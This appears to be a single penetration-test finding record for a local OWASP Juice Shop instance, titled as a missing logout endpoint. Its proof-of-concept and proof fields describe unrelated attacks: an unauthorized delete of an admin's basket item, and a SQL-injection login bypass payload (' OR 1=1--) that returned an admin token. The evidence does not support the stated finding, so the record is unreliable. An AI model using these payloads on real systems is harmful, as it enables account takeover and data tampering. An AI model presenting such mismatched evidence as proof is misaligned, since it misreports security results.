title: No Logout Endpoint - Token Cannot Be Invalidated
description: The application has no working logout endpoint. POST requests to /rest/user/logout return a 500 error with 'Unexpected path'. Without a logout mechanism, users cannot invalidate their session tokens, and stolen tokens remain valid permanently.
poc: Probe request against POST http://127.0.0.1:3010/rest/user/logout; observed proving result from prior stage handoff: DELETE /api/BasketItems/3 (belonged to admin BasketId=1) returned {"status":"success","data":{}} - verified via /rest/basket/1 showing item removed
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
